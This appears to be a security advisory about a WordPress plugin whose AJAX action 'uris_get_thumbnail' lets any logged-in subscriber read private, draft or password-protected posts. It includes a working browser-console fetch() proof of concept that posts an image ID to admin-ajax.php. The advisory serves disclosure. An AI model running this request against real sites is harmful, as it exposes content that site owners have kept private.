### Description

The plugin does not ensure that posts to be accessed via an AJAX action are slides and can be viewed by the user making the request, allowing any authenticated users, such as subscriber to access the content arbitrary post such as private, draft and password protected

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as subscriber user (4 being the ID of a private/draft/password protected post)
fetch("/wp-admin/admin-ajax.php?action=uris\_get\_thumbnail", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "imageid=4",
"method": "POST",
}).then((response) => {return response.text(); })
.then((data) => {
console.log(data);
})
The content of the post will be displayed in the rpgp\_image\_desc textarea.
